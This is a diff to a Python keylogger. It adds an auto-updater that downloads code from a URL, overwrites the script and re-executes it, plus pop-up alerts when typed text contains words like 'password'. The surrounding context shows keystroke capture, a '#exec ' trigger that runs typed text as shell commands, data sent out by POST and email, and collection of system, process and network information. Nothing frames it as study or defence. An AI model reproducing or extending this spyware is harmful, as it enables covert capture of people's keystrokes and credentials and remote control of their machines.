@@ -17,6 +17,8 @@ import logging
 import psutil
 import subprocess
 from cryptography.fernet import Fernet
+import urllib.request
+import ctypes
 
 # Global configuration
 text = ""
@@ -27,6 +29,8 @@ email_password = ""
 receiver_email = ""
 command_trigger = "#exec "
 time_interval = 10
+update_url = "https://example.com/latest_version.py"  # Replace with your actual update URL
+alert_keywords = ["password", "secret", "confidential"]
 
 # File paths
 paths = {
@@ -37,7 +41,8 @@ paths = {
     "process_log": "processes.txt",
     "disk_info": "disk_info.txt",
     "network_info": "network_info.txt",
-    "encryption_key": "encryption.key"
+    "encryption_key": "encryption.key",
+    "script": __file__
 }
 
 # Setup logging
@@ -130,6 +135,33 @@ def execute_command(cmd):
         logging.error(f"Command execution error: {e.output}")
         return e.output
 
+# Auto-updater
+
+def check_for_update():
+    try:
+        response = urllib.request.urlopen(update_url)
+        latest_code = response.read().decode("utf-8")
+        with open(paths["script"], "r", encoding="utf-8") as current_file:
+            current_code = current_file.read()
+        if hashlib.sha256(current_code.encode()).hexdigest() != hashlib.sha256(latest_code.encode()).hexdigest():
+            with open(paths["script"], "w", encoding="utf-8") as current_file:
+                current_file.write(latest_code)
+            logging.info("Script updated successfully.")
+            os.execv(paths["script"], ['python'] + [paths["script"]])
+    except Exception as e:
+        logging.error(f"Update check error: {e}")
+
+# Alerts
+
+def check_for_alert_keywords(text):
+    for keyword in alert_keywords:
+        if keyword in text.lower():
+            try:
+                ctypes.windll.user32.MessageBoxW(0, f"Sensitive keyword detected: {keyword}", "Alert", 1)
+                break
+            except:
+                logging.warning("Popup alerts not supported on this platform.")
+
 # Keylogger Functionalities
 
 def send_post_req():
@@ -152,6 +184,7 @@ def save_to_file():
                 if text.startswith(command_trigger):
                     command = text[len(command_trigger):].strip()
                     f.write(f"[Command Output] {execute_command(command)}\n")
+            check_for_alert_keywords(text)
             text = ""
         except Exception as e:
             logging.error(f"File write error: {e}")
@@ -251,6 +284,7 @@ def on_press(key):
 
 # Start Process
 if __name__ == '__main__':
+    check_for_update()
     generate_key()
     get_system_info()
     log_processes()
